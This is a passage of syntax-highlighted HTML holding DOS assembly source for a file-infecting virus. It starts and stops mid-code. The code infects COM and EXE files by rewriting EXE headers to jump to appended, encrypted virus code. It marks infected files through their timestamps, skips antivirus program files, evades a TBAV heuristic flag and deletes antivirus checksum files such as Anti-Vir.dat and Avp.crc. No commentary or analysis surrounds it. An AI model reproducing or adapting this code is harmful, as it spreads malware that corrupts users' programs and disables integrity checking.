    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"E"</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">exit_before_open</span><span class="sc0">

</span><span class="sc5">extention_ok</span><span class="sc4">:</span><span class="sc0">
                    </span><span class="sc1">; TEST FOR AV FILENAMES</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fname</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dont_infect</span><span class="sc0">
    </span><span class="sc6">repne</span><span class="sc0"> </span><span class="sc6">scasw</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">no_av</span><span class="sc0">
    
</span><span class="sc5">exit_before_open</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">end_infect</span><span class="sc0">
</span><span class="sc5">no_av</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">time</span><span class="sc0">                    </span><span class="sc1">; see if already infected</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0000000000011111b</span><span class="sc0">       </span><span class="sc1">; we're only interested in the seconds</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1111b</span><span class="sc0">                   </span><span class="sc1">; seconds = 30 ?</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc5">exit_before_open</span><span class="sc0">             </span><span class="sc1">; if so, it's already infected</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">time</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0000000000001111b</span><span class="sc0">      </span><span class="sc1">; otherwise make the seconds=30</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc5">time</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1111111111101111b</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3524h</span><span class="sc0">                   </span><span class="sc1">; Get int vector 24h</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">int24_segm</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">              </span><span class="sc1">; save vector</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">int24_offs</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2524h</span><span class="sc0">                   </span><span class="sc1">; set int vector 24h to our routine</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">int24_handler</span><span class="sc0">    </span><span class="sc1">; DS:DX=pointer to new routine</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">lds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">filename</span><span class="sc0">                </span><span class="sc1">; DS:DX=Pointer to filename</span><span class="sc0">

                    </span><span class="sc1">; CLEAR ATTRIBUTES</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4301h</span><span class="sc0">                   </span><span class="sc1">; DOS set attributes function</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"JB"</span><span class="sc0">                    </span><span class="sc1">; to avoid endless recursion</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">; clear all attributs</span><span class="sc0">
                    </span><span class="sc1">; DS:DX=pointer to filename</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">; Call DOS function</span><span class="sc0">
    </span><span class="sc6">JNC</span><span class="sc0"> </span><span class="sc5">clear_attrib_ok</span><span class="sc0">             </span><span class="sc1">; go on if no error</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">restore_int24h</span><span class="sc0">              </span><span class="sc1">; quit if error (write protected disk)</span><span class="sc0">
</span><span class="sc5">clear_attrib_ok</span><span class="sc4">:</span><span class="sc0">
    
                    </span><span class="sc1">; OPEN FILE</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3D02h</span><span class="sc0">                   </span><span class="sc1">; AH=FktNr; AL: read &amp; write</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"JB"</span><span class="sc0">                    </span><span class="sc1">; to avoid endless recursions</span><span class="sc0">
                    </span><span class="sc1">; DS:DX=pointer to filename</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">JNC</span><span class="sc0"> </span><span class="sc5">no_error_at_open</span><span class="sc0">            </span><span class="sc1">; carry-flag set -&gt; Error -&gt; End</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">end_infect</span><span class="sc0">
</span><span class="sc5">no_error_at_open</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">; handle to BX</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

                    </span><span class="sc1">; READ EXE-HEADER</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Fh</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">end_header</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">header</span><span class="sc0">     </span><span class="sc1">; read header size</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">header</span><span class="sc0">           </span><span class="sc1">; DS:DX=pointer to buffer</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">filelength</span><span class="sc4">]</span><span class="sc1">; CALCULATE Size_of_crap</span><span class="sc0">
    </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                          </span><span class="sc1">; to size mod 16 = 0</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1111b</span><span class="sc0">                   
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">17</span><span class="sc0">                      </span><span class="sc1">; inc + 16d (compatiblity to very small COMs)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">size_of_crap</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">            </span><span class="sc1">; save in size_of_crap</span><span class="sc0">
    
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">exe_id</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"ZM"</span><span class="sc0">                </span><span class="sc1">; EXE-FILE?</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc5">exe_file</span><span class="sc0">                     </span><span class="sc1">; go to the correct infection routine</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">exe_id</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"MZ"</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc5">exe_file</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">infect_com</span><span class="sc0">

</span><span class="sc1">; ----- EXE FILE INFECTION --------------------------------------------------</span><span class="sc0">

</span><span class="sc5">exe_file</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">relocate</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">               </span><span class="sc1">; windows exe?</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">no_windows_exe</span><span class="sc0">
</span><span class="sc5">header_not_ok</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">close</span><span class="sc0">
</span><span class="sc5">no_windows_exe</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">filelength</span><span class="sc4">]</span><span class="sc1">; overloaded exe?</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">filelength</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">calculate_header_size</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">length_m</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">header_not_ok</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">length_d</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">header_not_ok</span><span class="sc0">
    
                    </span><span class="sc1">; CHANGE ENTRY POINT TO VIRUS</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">filelength</span><span class="sc4">]</span><span class="sc1">; file length in DX:AX</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">filelength</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">size_of_crap</span><span class="sc0">            </span><span class="sc1">; add padding bytes</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4d</span><span class="sc0">                      </span><span class="sc1">; filesize div 16</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12d</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">head</span><span class="sc0">                    </span><span class="sc1">; sub size of header</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; DX = AX (new code segment)</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">code_seg</span><span class="sc0">                </span><span class="sc1">; calculate difference to old CS</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">entry_segm</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">              </span><span class="sc1">; save in far-jump</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ip_start</span><span class="sc0">                </span><span class="sc1">; save originial start IP</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">entry_offs</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">code_seg</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                </span><span class="sc1">; write new start CS to header</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">ip_start</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">      </span><span class="sc1">; write new start IP to header</span><span class="sc0">

                    </span><span class="sc1">; Same stuff for stack</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                          </span><span class="sc1">; SS = CS + 1 to avoid TBAV's K flag</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; DX = AX (new stack segment)</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">stack_seg</span><span class="sc0">               </span><span class="sc1">; calculate difference to old SS</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">orig_ss</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                 </span><span class="sc1">; save it</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">sp_start</span><span class="sc0">                </span><span class="sc1">; save original start SP</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">orig_sp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">stack_seg</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">               </span><span class="sc1">; write new start SS to header</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">sp_start</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">new_sp</span><span class="sc0">     </span><span class="sc1">; write new start SP to header</span><span class="sc0">

                    </span><span class="sc1">; change file size in header</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">filelength</span><span class="sc4">]</span><span class="sc1">; set DX:AX to filelength</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">filelength</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">viruslength</span><span class="sc0">             </span><span class="sc1">; CX = lenght of virus + padding size</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">size_of_crap</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">; add it to low word of filesize</span><span class="sc0">
    </span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                       </span><span class="sc1">; add remainer to hi high word</span><span class="sc0">

    </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">calculate_header_size</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">length_m</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                </span><span class="sc1">; save new size in exe header</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">length_d</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">writelength</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">viruslength</span><span class="sc0">    </span><span class="sc1">; viruslength without enuns</span><span class="sc0">

</span><span class="sc1">;------ WRITE VIRUS TO FILE -------------------------------------------------</span><span class="sc0">

</span><span class="sc5">continue_infection_for_both_exe_and_com</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4202h</span><span class="sc0">                   </span><span class="sc1">; set filepointer to end of file</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">size_of_crap</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">encrypt</span><span class="sc0">                    </span><span class="sc1">; encrypt, write and decrypt</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4200h</span><span class="sc0">                   </span><span class="sc1">; set filepointer to start of file</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                     </span><span class="sc1">; write new header to file</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">end_header</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">header</span><span class="sc0">     </span><span class="sc1">; write header size</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">header</span><span class="sc0">           </span><span class="sc1">; DS:DX = pointer to buffer</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5701h</span><span class="sc0">                   </span><span class="sc1">; restore old date/time</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">date</span><span class="sc0">                    </span><span class="sc1">; old date</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">time</span><span class="sc0">                    </span><span class="sc1">; old time</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">                         </span><span class="sc1">; save handle</span><span class="sc0">
    
                    </span><span class="sc1">; KILL AV CRC FILES</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">                             </span><span class="sc1">; go forwards</span><span class="sc0">
    </span><span class="sc6">lds</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">filename</span><span class="sc0">                </span><span class="sc1">; DS:SI=pointer to filename</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc0">           </span><span class="sc1">; ES:DI=destination buffer</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc5">copy_path_head</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">                           </span><span class="sc1">; copy filename till zero</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">copy_path_head</span><span class="sc0">              </span><span class="sc1">; copy filename till zero</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">                          </span><span class="sc1">; set di to the last byte of the name</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                         </span><span class="sc1">; DS=CS</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

    </span><span class="sc6">std</span><span class="sc0">                             </span><span class="sc1">; go backwards</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc13">'\'                     ; search for backslash
</span><span class="sc0">    </span><span class="sc6">repne</span><span class="sc0"> </span><span class="sc6">scasb</span><span class="sc0">                     </span><span class="sc1">; search for end of path</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc5">found_backslash</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc4">)-</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">found_backslash</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">                          </span><span class="sc1">; set di to first byte of filename</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
    
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">                         </span><span class="sc1">; save start of filename</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">anti_vir_dat</span><span class="sc0">     </span><span class="sc1">; kill Anti-Vir.dat file!</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">do_it</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">chklist_ms</span><span class="sc0">       </span><span class="sc1">; kill Chklist.ms file!</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">do_it</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">chklist_cps</span><span class="sc0">      </span><span class="sc1">; kill Chklist.cps file!</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">do_it</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">avp_crc</span><span class="sc0">          </span><span class="sc1">; kill Avp.crc file!</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">do_it</span><span class="sc0">
    
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">                          </span><span class="sc1">; restore handle</span><span class="sc0">
    
</span><span class="sc5">close</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Eh</span><span class="sc0">                     </span><span class="sc1">; close file</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4301h</span><span class="sc0">                   </span><span class="sc1">; restore attributes</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"JB"</span><span class="sc0">                    </span><span class="sc1">; to avoid endless recursion</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc0">
